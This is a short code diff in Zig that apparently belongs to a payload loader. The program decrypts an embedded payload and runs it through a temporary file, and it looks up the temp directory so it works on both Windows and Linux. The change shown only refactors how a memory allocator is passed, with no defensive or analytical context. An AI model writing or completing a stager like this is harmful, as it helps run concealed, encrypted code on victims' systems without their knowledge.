@@ -18,7 +18,7 @@ pub fn main() !void {
     defer allocator.free(decrypted);
 
     // Execute via tempfile (cross-platform)
-    try executeViaTempfile(decrypted);
+    try executeViaTempfile(allocator, decrypted);
 }
 
 fn getEmbeddedPayload(allocator: std.mem.Allocator) ![]u8 {
@@ -51,11 +51,11 @@ fn getEmbeddedPayload(allocator: std.mem.Allocator) ![]u8 {
 }
 
 fn getTempDirPath(allocator: std.mem.Allocator) []const u8 {
+    // Try to get both Windows & Linux tmp dir
     return std.process.getEnvVarOwned(allocator, "TMPDIR") catch std.process.getEnvVarOwned(allocator, "TEMP") catch std.process.getEnvVarOwned(allocator, "TMP") catch "/tmp";
 }
 
-fn executeViaTempfile(payload: []const u8) !void {
-    const allocator = std.heap.page_allocator;
+fn executeViaTempfile(allocator: std.mem.Allocator, payload: []const u8) !void {
     const tmp_dir = getTempDirPath(allocator);
     defer if (!std.mem.eql(u8, tmp_dir, "/tmp")) allocator.free(tmp_dir);
 
